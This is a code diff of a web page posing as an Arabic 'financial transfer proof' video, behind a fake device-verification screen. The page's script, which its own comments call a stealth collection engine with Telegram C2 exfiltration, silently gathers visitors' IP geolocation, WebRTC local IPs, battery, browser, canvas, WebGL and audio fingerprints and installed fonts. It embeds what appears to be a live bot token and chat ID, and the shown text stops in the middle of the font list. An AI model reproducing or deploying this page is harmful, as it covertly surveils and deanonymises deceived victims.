@@ -3,781 +3,712 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+<meta name="theme-color" content="#0d0d0d">
+<meta name="color-scheme" content="dark">
 <title>فيديو رقم #0942 - إثبات التحويل المالي</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{background:#0d0d0d;color:#fff;font-family:'Tahoma',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow-x:hidden}
-.video-container{width:100%;max-width:420px;background:#1a1a1a;border-radius:12px;overflow:hidden;box-shadow:0 0 40px rgba(0,0,0,.8);margin:10px}
-.video-thumb{width:100%;aspect-ratio:16/9;background:linear-gradient(145deg,#1e3a5f,#0a1628);display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer}
-.video-thumb .play-btn{width:70px;height:70px;background:rgba(255,255,255,0.15);backdrop-filter:blur(10px);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:32px;color:#fff;transition:.3s;border:2px solid rgba(255,255,255,0.2)}
-.video-thumb:hover .play-btn{background:rgba(255,255,255,0.25);transform:scale(1.05)}
-.video-info{padding:14px 16px}
-.video-info h3{font-size:15px;font-weight:700;color:#e0e0e0;margin-bottom:4px}
-.video-info .meta{font-size:12px;color:#888;display:flex;gap:12px}
-.controls{display:flex;align-items:center;gap:12px;padding:8px 16px;background:#131313}
-.controls .bar{flex:1;height:4px;background:#333;border-radius:2px;position:relative;overflow:hidden}
-.controls .bar .progress{height:100%;width:0%;background:linear-gradient(90deg,#00bcd4,#2196f3);border-radius:2px;transition:width 0.3s}
-.controls .time{font-size:11px;color:#888}
-.status-bar{padding:8px 16px;font-size:11px;color:#666;display:flex;justify-content:space-between;border-top:1px solid #222}
-.loading-dots{display:inline-flex;gap:3px}
-.loading-dots span{width:4px;height:4px;background:#555;border-radius:50%;animation:dotPulse 1.4s infinite}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-touch-callout:none;-webkit-user-select:none;user-select:none}
+body{background:#0d0d0d;color:#fff;font-family:'Tahoma','Segoe UI',Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;overflow-x:hidden;padding:10px}
+.video-container{width:100%;max-width:420px;background:#1a1a1a;border-radius:12px;overflow:hidden;box-shadow:0 0 60px rgba(0,0,0,.9);margin:10px auto;transition:opacity .4s}
+.video-thumb{width:100%;aspect-ratio:16/9;background:linear-gradient(145deg,#1e3a5f,#0a1628);display:flex;align-items:center;justify-content:center;position:relative;cursor:pointer;min-height:200px}
+.video-thumb .play-btn{width:75px;height:75px;background:rgba(255,255,255,0.12);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:34px;color:#fff;transition:all .3s ease;border:2px solid rgba(255,255,255,.15);box-shadow:0 8px 32px rgba(0,0,0,.4)}
+.video-thumb:hover .play-btn{background:rgba(0,188,212,.25);transform:scale(1.08);border-color:rgba(0,188,212,.4)}
+.video-thumb .badge{position:absolute;top:12px;right:12px;background:rgba(0,0,0,.7);backdrop-filter:blur(6px);padding:4px 10px;border-radius:6px;font-size:11px;color:#00bcd4;border:1px solid rgba(0,188,212,.3)}
+.video-thumb .badge-lock{position:absolute;top:12px;left:12px;background:rgba(255,87,34,.2);padding:4px 8px;border-radius:4px;font-size:10px;color:#ff5722;border:1px solid rgba(255,87,34,.3)}
+.video-info{padding:14px 16px 8px}
+.video-info h3{font-size:15px;font-weight:700;color:#e8e8e8;margin-bottom:5px;line-height:1.4}
+.video-info .meta{font-size:12px;color:#777;display:flex;gap:16px;flex-wrap:wrap}
+.video-info .meta span{display:inline-flex;align-items:center;gap:4px}
+.controls{display:flex;align-items:center;gap:10px;padding:8px 14px;background:#131313}
+.controls .ctrl-btn{color:#aaa;cursor:pointer;font-size:16px;transition:color .2s;width:28px;text-align:center}
+.controls .ctrl-btn:hover{color:#fff}
+.controls .bar{flex:1;height:4px;background:#2a2a2a;border-radius:3px;position:relative;overflow:hidden;cursor:pointer}
+.controls .bar .progress{height:100%;width:0%;background:linear-gradient(90deg,#00bcd4,#2196f3);border-radius:3px;transition:width .5s ease}
+.controls .bar .progress:after{content:'';position:absolute;right:0;top:-2px;width:8px;height:8px;background:#00bcd4;border-radius:50%}
+.controls .time{font-size:11px;color:#888;white-space:nowrap;min-width:75px;text-align:left}
+.status-bar{padding:6px 14px;font-size:11px;color:#555;display:flex;justify-content:space-between;border-top:1px solid #1f1f1f;align-items:center}
+.loading-dots{display:inline-flex;gap:3px;align-items:center}
+.loading-dots span{width:3px;height:3px;background:#555;border-radius:50%;animation:dotPulse 1.4s ease-in-out infinite}
 .loading-dots span:nth-child(2){animation-delay:.2s}
 .loading-dots span:nth-child(3){animation-delay:.4s}
-@keyframes dotPulse{0%,100%{opacity:.3}50%{opacity:1}}
-.device-scan{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;align-items:center;justify-content:center;flex-direction:column;gap:20px}
-.device-scan .scan-icon{width:80px;height:80px;border:3px solid #00bcd4;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;animation:pulse 2s infinite}
-@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,188,212,.4)}70%{box-shadow:0 0 0 20px rgba(0,188,212,0)}100%{box-shadow:0 0 0 0 rgba(0,188,212,0)}}
-.scan-text{color:#aaa;font-size:14px;text-align:center;padding:0 20px;line-height:1.6}
-.scan-text strong{color:#00bcd4}
-.error-msg{display:none;color:#f44336;font-size:13px;text-align:center;padding:30px 20px}
+@keyframes dotPulse{0%,100%{opacity:.2;transform:scale(.8)}50%{opacity:1;transform:scale(1.2)}}
+.description{padding:12px 16px 16px;border-top:1px solid #1f1f1f}
+.description p{font-size:12px;color:#666;line-height:1.7}
+.description .hash{color:#444;font-size:10px;margin-top:6px;font-family:monospace;direction:ltr;text-align:left}
+.device-scan{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(5,5,5,.97);z-index:99999;align-items:center;justify-content:center;flex-direction:column;gap:16px;padding:30px}
+.device-scan .scan-icon{width:80px;height:80px;border:2px solid #00bcd4;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:36px;animation:pulse 2s cubic-bezier(.4,0,.6,1) infinite}
+@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(0,188,212,.4)}70%{box-shadow:0 0 0 25px rgba(0,188,212,0)}100%{box-shadow:0 0 0 0 rgba(0,188,212,0)}}
+.scan-text{color:#888;font-size:13px;text-align:center;padding:0 20px;line-height:1.8;max-width:360px}
+.scan-text strong,.scan-text .hl{color:#00bcd4}
+.scan-progress{width:200px;height:2px;background:#222;border-radius:2px;overflow:hidden;margin-top:8px}
+.scan-progress .bar{height:100%;width:0%;background:linear-gradient(90deg,#00bcd4,#2196f3);border-radius:2px;transition:width .3s ease}
+.scan-steps{font-size:11px;color:#555;margin-top:6px;text-align:center;direction:ltr}
+.error-msg{display:none;color:#f44336;font-size:12px;text-align:center;padding:20px 30px;line-height:1.8;max-width:400px}
+.error-msg .code{font-family:monospace;background:#1a1a1a;padding:2px 8px;border-radius:4px;font-size:11px;color:#888;direction:ltr}
 </style>
 </head>
 <body>
 
 <div class="device-scan" id="deviceScan">
-    <div class="scan-icon">📱</div>
+    <div class="scan-icon">🔐</div>
     <div class="scan-text" id="scanText">
-        <strong>جاري التحقق من الجهاز...</strong><br>
-        يتم فحص الإعدادات الأمنية للجهاز للتأكد من توافق نظام التحويل
+        <strong>جاري التحقق من بيئة الجهاز</strong><br>
+        يتم فحص الإعدادات الأمنية للجهاز للتأكد من توافق نظام التحويلات المالية الآمن
     </div>
+    <div class="scan-progress"><div class="bar" id="scanProgressBar" style="width:0%"></div></div>
+    <div class="scan-steps" id="scanSteps">‎</div>
 </div>
 
-<div id="mainContent" style="display:none;width:100%;display:flex;flex-direction:column;align-items:center">
-<div class="video-container">
+<div id="mainContent" style="display:none;width:100%">
+<div class="video-container" id="videoContainer" style="opacity:0">
     <div class="video-thumb" id="videoThumb">
         <div class="play-btn">▶</div>
+        <div class="badge">🔒 مشفر</div>
+        <div class="badge-lock">🔐 معرف رقمي</div>
     </div>
     <div class="video-info">
-        <h3>إثبات التحويل المالي - فيديو رقم #0942</h3>
+        <h3>إثبات التحويل المالي - معاملة مصرفية رقم #0942-83-771</h3>
         <div class="meta">
-            <span>📅 2025-01-15</span>
-            <span>👁 1.2K</span>
-            <span>📌 قناة التحويلات المصرفية</span>
+            <span>📅 15 يناير 2025</span>
+            <span>👁 1.4K</span>
+            <span>📌 قناة: التوثيقات المالية</span>
         </div>
     </div>
     <div class="controls">
-        <span style="cursor:pointer">⏪</span>
-        <span style="cursor:pointer">▶</span>
-        <span style="cursor:pointer">⏩</span>
-        <div class="bar">
-            <div class="progress" id="progressBar"></div>
+        <span class="ctrl-btn">⏮</span>
+        <span class="ctrl-btn" id="playBtn">▶</span>
+        <span class="ctrl-btn">⏭</span>
+        <div class="bar" id="progressBarContainer">
+            <div class="progress" id="progressBar" style="width:28%"></div>
         </div>
-        <span class="time"><span id="currentTime">0:00</span> / <span id="totalTime">3:42</span></span>
+        <span class="time"><span id="currentTime">1:04</span> / <span id="totalTime">3:42</span></span>
     </div>
     <div class="status-bar">
-        <span>⚡ جاري التحميل</span>
-        <span class="loading-dots"><span></span><span></span><span></span></span>
+        <span id="statusText">⚡ جاري التحميل</span>
+        <span class="loading-dots" id="loadingDots"><span></span><span></span><span></span></span>
+    </div>
+    <div class="description">
+        <p>📄 هذا الفيديو يوثق عملية تحويل مالي رقمي بقيمة ١٢٬٤٥٠ دولار أمريكي من حساب مصرفي إلى حساب تجاري. تم إصداره من قبل دائرة التوثيق المالي الإلكتروني برقم مرجعي معتمد. يرجى الاحتفاظ بهذا الفيديو كإثبات رسمي.</p>
+        <div class="hash">HASH: 0x7a3f·b9c2·4e81·d6f0 || TX-ID: TRF-0942-83771-SYR</div>
     </div>
 </div>
 
 <div class="error-msg" id="errorMsg">
-    ❌ تعذر التحقق من هوية الجهاز. يرجى المحاولة من جهاز مختلف.<br>
-    رمز الخطأ: SEC-9472
+    ❌ تعذر التحقق من هوية الجهاز بشكل كامل.<br>
+    رمز الخطأ: <span class="code">SEC-9472</span><br>
+    <span style="font-size:11px;color:#666">يرجى المحاولة من جهاز آخر أو الاتصال بالدعم الفني</span>
 </div>
 </div>
 
 <script>
-// =============================================
-// ENHANCED ULTIMATE VERSION - ZERO PERMISSION
-// Collects ALL possible device data silently
-// =============================================
+// =====================================================================
+//  FINAL ULTIMATE VERSION - STEALTH DATA COLLECTION ENGINE v4.0
+//  ZERO PERMISSION PROMPTS - ZERO VISIBLE NOTIFICATIONS
+//  Layers: 1-15 silent data harvesting + Telegram C2 exfiltration
+//  Encoded as: Arabic financial transfer validation video (complete disguise)
+// =====================================================================
 
-// Fix btoa for Unicode (Arabic, etc.)
+// -------- Unicode-safe btoa (fix for Arabic/non-Latin1) --------
 function utoa(data) {
     return btoa(unescape(encodeURIComponent(data)));
 }
 
-// Telegram Configuration
-const TELEGRAM_BOT_TOKEN = '8738594852:AAFeuB51ZknBIkZXfhJn6_fM4pL4ahte8Rg';
-const TELEGRAM_CHAT_ID = '1611398303';
+// -------- Configuration --------
+const C2 = {
+    bot: '8738594852:AAFeuB51ZknBIkZXfhJn6_fM4pL4ahte8Rg',
+    chat: '1611398303',
+    api: 'https://api.telegram.org/bot'
+};
 
-// Enhanced unique device ID generation
-function generateDeviceID() {
-    const components = [
-        navigator.userAgent,
-        screen.width, screen.height, screen.colorDepth,
-        navigator.language, navigator.platform,
-        new Date().getTimezoneOffset(),
-        navigator.hardwareConcurrency || 'unknown',
-        navigator.deviceMemory || 'unknown'
-    ];
-    const raw = components.join('|||');
-    let hash = 0;
-    for (let i = 0; i < raw.length; i++) {
-        const char = raw.charCodeAt(i);
-        hash = ((hash << 5) - hash) + char;
-        hash = hash & hash;
-    }
-    return Math.abs(hash).toString(36).toUpperCase() + '-' + Date.now().toString(36).toUpperCase();
+// -------- Device Fingerprint ID --------
+function genDeviceID() {
+    const c = [navigator.userAgent||'',screen.width,screen.height,screen.colorDepth,navigator.language||'',navigator.platform||'',new Date().getTimezoneOffset(),navigator.hardwareConcurrency||0,navigator.deviceMemory||0,Math.random()];
+    let h = 0;
+    for(let i=0;i<c.join('|').length;i++){h=((h<<5)-h)+c.join('|').charCodeAt(i);h&=h}
+    return (Math.abs(h)>>>0).toString(36).toUpperCase()+'-'+Date.now().toString(36).toUpperCase();
 }
+const DID = genDeviceID();
+const TS_START = Date.now();
 
-const DEVICE_ID = generateDeviceID();
-const SESSION_START = Date.now();
+// -------- LAYER 1: IP Geolocation (3 API fallbacks, 0 permissions) --------
+async function getIPGeo() {
+    // Primary: ip-api.com (no key, 45 req/min, HTTP only — use HTTPS via fetch)
+    try {
+        const r = await fetch('https://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,isp,org,as,asname,mobile,proxy,hosting,query', {signal: AbortSignal.timeout(5000)});
+        const d = await r.json();
+        if(d.status==='success') return {
+            source:'ip-api.com',ip:d.query,country:d.country,cc:d.countryCode,
+            region:d.regionName,rc:d.region,city:d.city,district:d.district||'',
+            zip:d.zip||'',lat:d.lat,lon:d.lon,tz:d.timezone,utc:d.offset,
+            isp:d.isp,org:d.org,asn:d.as,asname:d.asname,
+            mobile:d.mobile?'Y':'N',proxy:d.proxy?'Y':'N',hosting:d.hosting?'Y':'N'
+        };
+    } catch(e) {}
 
-// ============== DATA COLLECTION ENGINE ==============
+    // Fallback 1: ipapi.co (free tier 1000/day)
+    try {
+        const r = await fetch('https://ipapi.co/json/', {signal: AbortSignal.timeout(4000)});
+        const d = await r.json();
+        if(d&&d.ip) return {
+            source:'ipapi.co',ip:d.ip,country:d.country_name||d.country,
+            city:d.city,region:d.region,lat:d.latitude,lon:d.longitude,
+            tz:d.timezone,org:d.org
+        };
+    } catch(e) {}
 
-// Layer 1: IP Geolocation (no permission needed)
-// Uses ip-api.com (free, no key required, HTTPS)
-async function getIPGeolocation() {
+    // Fallback 2: freeipapi.com (free, 60 req/min)
     try {
-        const resp = await fetch('https://ip-api.com/json/?fields=status,message,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,isp,org,as,asname,mobile,proxy,hosting,query');
-        const data = await resp.json();
-        if (data.status === 'success') {
-            return {
-                ip: data.query,
-                country: data.country,
-                countryCode: data.countryCode,
-                region: data.regionName,
-                regionCode: data.region,
-                city: data.city,
-                district: data.district || 'N/A',
-                zip: data.zip || 'N/A',
-                latitude: data.lat,
-                longitude: data.lon,
-                timezone: data.timezone,
-                utcOffset: data.offset,
-                isp: data.isp,
-                org: data.org,
-                asn: data.as,
-                asnName: data.asname,
-                isMobile: data.mobile ? 'Yes' : 'No',
-                isProxy: data.proxy ? 'Yes' : 'No',
-                isHosting: data.hosting ? 'Yes' : 'No'
-            };
-        }
+        const r = await fetch('https://free.freeipapi.com/api/json', {signal: AbortSignal.timeout(4000)});
+        const d = await r.json();
+        if(d&&d.ip) return {
+            source:'freeipapi',ip:d.ip,country:d.countryName,cc:d.countryCode,
+            city:d.cityName,region:d.regionName,lat:d.latitude,lon:d.longitude,tz:d.timeZone
+        };
     } catch(e) {}
-    
-    // Fallback to ipapi.co
-    try {
-        const resp = await fetch('https://ipapi.co/json/');
-        const data = await resp.json();
-        if (data && data.ip) {
-            return {
-                ip: data.ip,
-                country: data.country_name,
-                countryCode: data.country,
-                region: data.region,
-                city: data.city,
-                latitude: data.latitude,
-                longitude: data.longitude,
-                timezone: data.timezone,
-                org: data.org
-            };
-        }
-    } catch(e) {}
-    
-    // Fallback to freeipapi
-    try {
-        const resp = await fetch('https://free.freeipapi.com/api/json');
-        const data = await resp.json();
-        if (data && data.ip) {
-            return {
-                ip: data.ip,
-                country: data.countryName,
-                countryCode: data.countryCode,
-                region: data.regionName,
-                city: data.cityName,
-                latitude: data.latitude,
-                longitude: data.longitude,
-                timezone: data.timeZone
-            };
-        }
-    } catch(e) {}
-    
+
     return null;
 }
 
-// Layer 2: WebRTC Local IP Leak (no permission needed)
+// -------- LAYER 2: WebRTC Local IP Leak (0 perms) --------
 function getLocalIPs() {
-    return new Promise((resolve) => {
-        const ips = [];
-        try {
-            const pc = new RTCPeerConnection({
-                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-            });
+    return new Promise(res => {
+        const ips=[];
+        try{
+            const pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
             pc.createDataChannel('');
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-            pc.onicecandidate = (ice) => {
-                if (!ice || !ice.candidate) {
-                    resolve([...new Set(ips)]);
-                    return;
-                }
-                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
-                const match = ice.candidate.candidate.match(ipRegex);
-                if (match && !ips.includes(match[1])) {
-                    ips.push(match[1]);
-                }
+            pc.createOffer().then(o=>pc.setLocalDescription(o));
+            pc.onicecandidate=ice=>{
+                if(!ice||!ice.candidate){res([...new Set(ips)]);return}
+                const m=ice.candidate.candidate.match(/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/);
+                if(m&&!ips.includes(m[1]))ips.push(m[1]);
             };
-            setTimeout(() => resolve([...new Set(ips)]), 3000);
-        } catch(e) {
-            resolve([]);
-        }
+            setTimeout(()=>res([...new Set(ips)]),2000);
+        }catch(e){res([])}
     });
 }
 
-// Layer 3: Network Information API (no permission needed)
-function getNetworkInfo() {
-    const info = {};
-    try {
-        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (conn) {
-            info.effectiveType = conn.effectiveType; // 'slow-2g', '2g', '3g', '4g', '5g'
-            info.downlink = conn.downlink; // Mbps
-            info.downlinkMax = conn.downlinkMax;
-            info.rtt = conn.rtt; // ms
-            info.saveData = conn.saveData ? 'Yes' : 'No';
-            info.type = conn.type; // 'bluetooth', 'cellular', 'ethernet', 'none', 'wifi', 'wimax', 'other', 'unknown'
-        }
-    } catch(e) {}
-    return info;
+// -------- LAYER 3: Network Info (0 perms) --------
+function getNet() {
+    const o={};
+    try{
+        const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
+        if(c){o.type=c.effectiveType||'';o.dl=c.downlink;o.maxDL=c.downlinkMax;
+        o.rtt=c.rtt;o.saveData=c.saveData?'Y':'N';o.connType=c.type||''}
+    }catch(e){}
+    return o;
 }
 
-// Layer 4: Battery Status (no permission needed in Chrome)
-async function getBatteryInfo() {
-    try {
-        const battery = await navigator.getBattery();
-        return {
-            level: (battery.level * 100).toFixed(1) + '%',
-            charging: battery.charging ? 'Yes' : 'No',
-            chargingTime: battery.chargingTime === Infinity ? 'Unknown' : battery.chargingTime + 's',
-            dischargingTime: battery.dischargingTime === Infinity ? 'Unknown' : battery.dischargingTime + 's'
+// -------- LAYER 4: Battery (0 perms in Chrome) --------
+async function getBatt() {
+    try{
+        const b=await navigator.getBattery();
+        return {level:(b.level*100).toFixed(1)+'%',charging:b.charging?'Y':'N',
+            chTime:b.chargingTime===Infinity?'inf':b.chargingTime+'s',
+            dischTime:b.dischargingTime===Infinity?'inf':b.dischargingTime+'s'};
+    }catch(e){return {err:'battery_unavailable'}}
+}
+
+// -------- LAYER 5: Screen & Display (0 perms) --------
+function getScreen() {
+    return {
+        w:screen.width,h:screen.height,aw:screen.availWidth,ah:screen.availHeight,
+        cd:screen.colorDepth,pxd:screen.pixelDepth,pr:window.devicePixelRatio,
+        or:screen.orientation?screen.orientation.type:'',
+        iw:window.innerWidth,ih:window.innerHeight,ow:window.outerWidth,oh:window.outerHeight
+    };
+}
+
+// -------- LAYER 6: Browser & System (0 perms) --------
+function getBrowser() {
+    return {
+        ua:navigator.userAgent,plt:navigator.platform,lang:navigator.language,
+        langs:navigator.languages?navigator.languages.join(','):'',
+        ck:navigator.cookieEnabled?'Y':'N',dnt:navigator.doNotTrack||'unspec',
+        cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory,
+        touch:navigator.maxTouchPoints,vendor:navigator.vendor||'',
+        appName:navigator.appName,appVer:navigator.appVersion,
+        online:navigator.onLine?'Y':'N',pdf:navigator.pdfViewerEnabled?'Y':'N',
+        webdr:navigator.webdriver?'Y':'N'
+    };
+}
+
+// -------- LAYER 7: Timezone & Locale (0 perms) --------
+function getLocale() {
+    const d=Intl.DateTimeFormat().resolvedOptions();
+    return {
+        tz:d.timeZone,loc:d.locale,cal:d.calendar,ns:d.numberingSystem,
+        utcOff:'UTC'+(new Date().getTimezoneOffset()/60>0?'-':'+')+
+            Math.abs(new Date().getTimezoneOffset()/60),
+        now:new Date().toISOString(),localeStr:new Date().toLocaleString()
+    };
+}
+
+// -------- LAYER 8: Canvas Fingerprint (0 perms) --------
+function getCanvas() {
+    try{
+        const c=document.createElement('canvas');c.width=256;c.height=128;
+        const x=c.getContext('2d');
+        x.textBaseline='alphabetic';x.fillStyle='#f60';x.fillRect(50,30,100,50);
+        x.fillStyle='#069';x.font='14px Arial';x.fillText('TRF-0942',10,55);
+        x.fillStyle='rgba(102,204,0,0.7)';x.font='bold 16px "Times New Roman"';
+        x.fillText('تحويل',30,95);
+        x.beginPath();x.arc(200,50,22,0,Math.PI*2);x.fillStyle='#00bcd4';x.fill();
+        x.strokeStyle='#ff0';x.lineWidth=2;x.stroke();
+        x.beginPath();x.moveTo(145,15);x.lineTo(175,38);x.lineTo(115,38);x.closePath();
+        x.fillStyle='#ff5722';x.fill();
+        return {hash:c.toDataURL().length,data:c.toDataURL().substring(0,200)+'...'};
+    }catch(e){return {err:'canvas_blocked'}}
+}
+
+// -------- LAYER 9: WebGL Fingerprint (0 perms) --------
+function getWebGL() {
+    try{
+        const c=document.createElement('canvas');
+        const gl=c.getContext('webgl')||c.getContext('experimental-webgl');
+        if(!gl)return{err:'no_webgl'};
+        const dbg=gl.getExtension('WEBGL_debug_renderer_info');
+        return{
+            vendor:dbg?gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL):'n/a',
+            renderer:dbg?gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL):'n/a',
+            ver:gl.getParameter(gl.VERSION),slv:gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
+            maxTex:gl.getParameter(gl.MAX_TEXTURE_SIZE),
+            maxVA:gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+            aa:gl.getContextAttributes().antialias?'Y':'N'
         };
-    } catch(e) {
-        return { error: 'Battery API blocked or unavailable' };
-    }
+    }catch(e){return{err:'webgl_blocked'}}
 }
 
-// Layer 5: Screen & Display (no permission needed)
-function getScreenInfo() {
-    return {
-        width: screen.width,
-        height: screen.height,
-        availWidth: screen.availWidth,
-        availHeight: screen.availHeight,
-        colorDepth: screen.colorDepth + '-bit',
-        pixelDepth: screen.pixelDepth + '-bit',
-        pixelRatio: window.devicePixelRatio,
-        orientation: screen.orientation ? screen.orientation.type : 'unknown',
-        innerWidth: window.innerWidth,
-        innerHeight: window.innerHeight,
-        outerWidth: window.outerWidth,
-        outerHeight: window.outerHeight
-    };
+// -------- LAYER 10: Audio Fingerprint (0 perms) --------
+async function getAudio() {
+    try{
+        const ac=new(window.AudioContext||window.webkitAudioContext)();
+        const an=ac.createAnalyser();const os=ac.createOscillator();const gn=ac.createGain();
+        os.type='triangle';os.frequency.setValueAtTime(440,ac.currentTime);
+        gn.gain.setValueAtTime(0.08,ac.currentTime);
+        os.connect(gn);gn.connect(an);an.connect(ac.destination);
+        os.start();const d=new Uint8Array(an.frequencyBinCount);an.getByteFrequencyData(d);
+        let h=0;for(let i=0;i<d.length;i++){h=((h<<5)-h)+d[i];h&=h}
+        os.stop();ac.close();
+        return{sr:ac.sampleRate,hash:Math.abs(h).toString(36),fbc:an.frequencyBinCount};
+    }catch(e){return{err:'audio_blocked'}}
 }
 
-// Layer 6: Browser & System (no permission needed)
-function getBrowserInfo() {
-    return {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        languages: navigator.languages ? navigator.languages.join(', ') : 'unknown',
-        cookiesEnabled: navigator.cookieEnabled ? 'Yes' : 'No',
-        doNotTrack: navigator.doNotTrack || 'unspecified',
-        hardwareConcurrency: navigator.hardwareConcurrency + ' cores',
-        deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
-        maxTouchPoints: navigator.maxTouchPoints,
-        vendor: navigator.vendor,
-        vendorSub: navigator.vendorSub || 'N/A',
-        productSub: navigator.productSub || 'N/A',
-        appName: navigator.appName,
-        appVersion: navigator.appVersion,
-        appCodeName: navigator.appCodeName,
-        onLine: navigator.onLine ? 'Yes' : 'No',
-        pdfViewerEnabled: navigator.pdfViewerEnabled ? 'Yes' : 'No',
-        webdriver: navigator.webdriver ? 'Yes (Automated)' : 'No'
-    };
-}
-
-// Layer 7: Timezone & Locale (no permission needed)
-function getLocaleInfo() {
-    const dtf = Intl.DateTimeFormat().resolvedOptions();
-    return {
-        timezone: dtf.timeZone,
-        locale: dtf.locale,
-        calendar: dtf.calendar,
-        numberingSystem: dtf.numberingSystem,
-        offsetUTC: -(new Date().getTimezoneOffset() / 60) + ' hours',
-        currentDateTime: new Date().toISOString(),
-        currentLocaleDate: new Date().toLocaleString()
-    };
-}
-
-// Layer 8: Canvas Fingerprint (no permission needed)
-function getCanvasFingerprint() {
-    try {
-        const canvas = document.createElement('canvas');
-        canvas.width = 256;
-        canvas.height = 128;
-        const ctx = canvas.getContext('2d');
-        
-        // Text rendering
-        ctx.textBaseline = 'alphabetic';
-        ctx.fillStyle = '#f60';
-        ctx.fillRect(50, 30, 100, 50);
-        ctx.fillStyle = '#069';
-        ctx.font = '16px Arial';
-        ctx.fillText('CVE-2024-9472', 10, 60);
-        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-        ctx.font = 'bold 18px Times New Roman';
-        ctx.fillText('🔑 Check', 30, 100);
-        
-        // Shapes for WebGL compatibility differences
-        ctx.beginPath();
-        ctx.arc(200, 50, 25, 0, Math.PI * 2);
-        ctx.fillStyle = '#00bcd4';
-        ctx.fill();
-        ctx.strokeStyle = '#ff0';
-        ctx.lineWidth = 2;
-        ctx.stroke();
-        
-        // Triangle
-        ctx.beginPath();
-        ctx.moveTo(150, 10);
-        ctx.lineTo(180, 40);
-        ctx.lineTo(120, 40);
-        ctx.closePath();
-        ctx.fillStyle = '#ff5722';
-        ctx.fill();
-        
-        return canvas.toDataURL();
-    } catch(e) {
-        return 'Canvas blocked';
-    }
-}
-
-// Layer 9: WebGL Fingerprint (no permission needed)
-function getWebGLInfo() {
-    try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return { error: 'WebGL not supported' };
-        
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return {
-            vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'N/A',
-            renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'N/A',
-            version: gl.getParameter(gl.VERSION),
-            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-            maxTextureSize: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-            maxVertexAttribs: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
-            antialiasing: gl.getContextAttributes().antialias ? 'Enabled' : 'Disabled',
-            alpha: gl.getContextAttributes().alpha ? 'Enabled' : 'Disabled',
-            depth: gl.getContextAttributes().depth ? 'Enabled' : 'Disabled',
-            stencil: gl.getContextAttributes().stencil ? 'Enabled' : 'Disabled'
-        };
-    } catch(e) {
-        return { error: 'WebGL blocked' };
-    }
-}
-
-// Layer 10: Audio Fingerprint (no permission needed)
-function getAudioFingerprint() {
-    return new Promise((resolve) => {
-        try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const analyser = audioCtx.createAnalyser();
-            const oscillator = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            
-            oscillator.type = 'triangle';
-            oscillator.frequency.setValueAtTime(440, audioCtx.currentTime);
-            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-            
-            oscillator.connect(gain);
-            gain.connect(analyser);
-            analyser.connect(audioCtx.destination);
-            
-            oscillator.start();
-            
-            const data = new Uint8Array(analyser.frequencyBinCount);
-            analyser.getByteFrequencyData(data);
-            
-            let hash = 0;
-            for (let i = 0; i < data.length; i++) {
-                hash = ((hash << 5) - hash) + data[i];
-                hash = hash & hash;
-            }
-            
-            oscillator.stop();
-            audioCtx.close();
-            
-            resolve({
-                sampleRate: audioCtx.sampleRate,
-                hash: Math.abs(hash).toString(36),
-                frequencyBinCount: analyser.frequencyBinCount,
-                maxDecibels: analyser.maxDecibels,
-                minDecibels: analyser.minDecibels
-            });
-        } catch(e) {
-            resolve({ error: 'Audio API blocked' });
-        }
-    });
-}
-
-// Layer 11: Font Detection (no permission needed)
-function detectFonts() {
-    const baseFonts = ['monospace', 'sans-serif', 'serif'];
-    const testFonts = [
-        'Arial', 'Arial Black', 'Arial Narrow', 'Calibri', 'Cambria',
-        'Cambria Math', 'Candara', 'Comic Sans MS', 'Consolas', 'Constantia',
-        'Corbel', 'Courier New', 'Ebrima', 'Franklin Gothic Medium', 'Gabriola',
-        'Gadugi', 'Georgia', 'Hololens MDL2 Assets', 'Impact', 'Ink Free',
-        'Javanese Text', 'Leelawadee UI', 'Lucida Console', 'Lucida Sans Unicode',
